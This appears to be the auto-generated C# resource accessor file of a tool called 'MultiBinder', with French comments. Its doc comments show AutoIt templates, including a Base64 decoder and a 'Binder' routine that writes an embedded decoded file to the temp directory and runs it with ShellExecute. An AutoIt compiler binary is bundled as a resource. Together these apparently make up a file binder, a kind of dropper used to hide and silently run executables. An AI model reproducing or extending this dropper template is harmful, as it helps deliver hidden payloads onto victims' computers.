﻿//------------------------------------------------------------------------------
// <auto-generated>
//     Ce code a été généré par un outil.
//     Version du runtime :4.0.30319.42000
//
//     Les modifications apportées à ce fichier peuvent provoquer un comportement incorrect et seront perdues si
//     le code est régénéré.
// </auto-generated>
//------------------------------------------------------------------------------

namespace MultiBinder.Properties {
    using System;
    
    
    /// <summary>
    ///   Une classe de ressource fortement typée destinée, entre autres, à la consultation des chaînes localisées.
    /// </summary>
    // Cette classe a été générée automatiquement par la classe StronglyTypedResourceBuilder
    // à l'aide d'un outil, tel que ResGen ou Visual Studio.
    // Pour ajouter ou supprimer un membre, modifiez votre fichier .ResX, puis réexécutez ResGen
    // avec l'option /str ou régénérez votre projet VS.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Retourne l'instance ResourceManager mise en cache utilisée par cette classe.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("MultiBinder.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Remplace la propriété CurrentUICulture du thread actuel pour toutes
        ///   les recherches de ressources à l'aide de cette classe de ressource fortement typée.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Drawing.Bitmap.
        /// </summary>
        internal static System.Drawing.Bitmap _237034_file_document_add_plus_512 {
            get {
                object obj = ResourceManager.GetObject("237034-file_document_add_plus-512", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Drawing.Bitmap.
        /// </summary>
        internal static System.Drawing.Bitmap _237037_file_document_remove_delete_denied_512 {
            get {
                object obj = ResourceManager.GetObject("237037-file_document_remove_delete_denied-512", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une ressource localisée de type System.Byte[].
        /// </summary>
        internal static byte[] Aut2exe {
            get {
                object obj = ResourceManager.GetObject("Aut2exe", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à Func _Base64Decode($string)
        ///	Local $calldll = DllCall(&quot;Crypt32.dll&quot;, &quot;bool&quot;, &quot;CryptStringToBinaryA&quot;, &quot;str&quot;, $string, &quot;dword&quot;, 0, &quot;dword&quot;, 1, &quot;ptr&quot;, 0, &quot;dword*&quot;, 0, &quot;ptr&quot;, 0, &quot;ptr&quot;, 0)
        ///	If @error Or Not $calldll[0] Then Return SetError(1, 0, &quot;&quot;)
        ///	Local $struct = DllStructCreate(&quot;byte[&quot; &amp; $calldll[5] &amp; &quot;]&quot;)
        ///	$calldll = DllCall(&quot;Crypt32.dll&quot;, &quot;bool&quot;, &quot;CryptStringToBinaryA&quot;, &quot;str&quot;, $string, &quot;dword&quot;, 0, &quot;dword&quot;, 1, &quot;struct*&quot;, $struct, &quot;dword*&quot;, $calldll[5], &quot;ptr&quot;, 0, &quot;ptr&quot;, 0)
        ///	If @error Or Not $calldll[0]  [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Base64 {
            get {
                return ResourceManager.GetString("Base64", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à Func %binder%()
        ///	$%path% = @TempDir &amp; &apos;\%filename%&apos;
        ///	%base64%
        ///	$%var% = Binary(_Base64Decode($%var%))
        ///	If FileExists($%path%) Then
        ///		FileDelete($%path%)
        ///	EndIf
        ///	FileWrite($%path%, $%var%)
        ///	ShellExecute($%path%)
        ///EndFunc
        ///
        ///%binder%().
        /// </summary>
        internal static string Binder {
            get {
                return ResourceManager.GetString("Binder", resourceCulture);
            }
        }
    }
}
